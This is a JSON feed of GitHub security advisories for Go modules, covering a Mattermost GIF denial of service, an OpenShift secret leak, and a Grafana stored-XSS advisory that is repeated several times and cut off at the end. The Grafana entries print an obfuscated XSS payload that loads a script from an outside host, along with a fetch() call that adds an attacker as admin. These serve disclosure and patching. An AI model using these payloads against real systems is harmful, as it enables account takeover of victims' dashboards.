{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>Mattermost version 7.1.x and earlier fails to sufficiently process a specifically crafted GIF file when it is uploaded while drafting a post, which allows authenticated users to cause resource exhaustion while processing the file, resulting in server-side Denial of Service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3257\">https://nvd.nist.gov/vuln/detail/CVE-2022-3257</a></li>\n<li><a href=\"https://hackerone.com/reports/1620170\">https://hackerone.com/reports/1620170</a></li>\n<li><a href=\"https://mattermost.com/security-updates/\">https://mattermost.com/security-updates/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m7w4-q5vg-5xfp\">https://github.com/advisories/GHSA-m7w4-q5vg-5xfp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m7w4-q5vg-5xfp",
            "title": "[github.com/mattermost/mattermost-server/v6] Mattermost subject to Denial of Service via upload of special GIF",
            "date_modified": "2023-03-27T14:28:00.000Z",
            "date_published": "2022-09-25T00:00:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m7w4-q5vg-5xfp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3684\">https://nvd.nist.gov/vuln/detail/CVE-2021-3684</a></li>\n<li><a href=\"https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4\">https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4</a></li>\n<li><a href=\"https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a\">https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1985962\">https://bugzilla.redhat.com/show_bug.cgi?id=1985962</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g8xm-p2h4-v6jp\">https://github.com/advisories/GHSA-g8xm-p2h4-v6jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g8xm-p2h4-v6jp",
            "title": "[github.com/openshift/assisted-installer] OpenShift Assisted Installer leaks image pull secrets as plaintext in installation logs",
            "date_modified": "2023-03-24T21:59:19.000Z",
            "date_published": "2023-03-24T21:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g8xm-p2h4-v6jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": 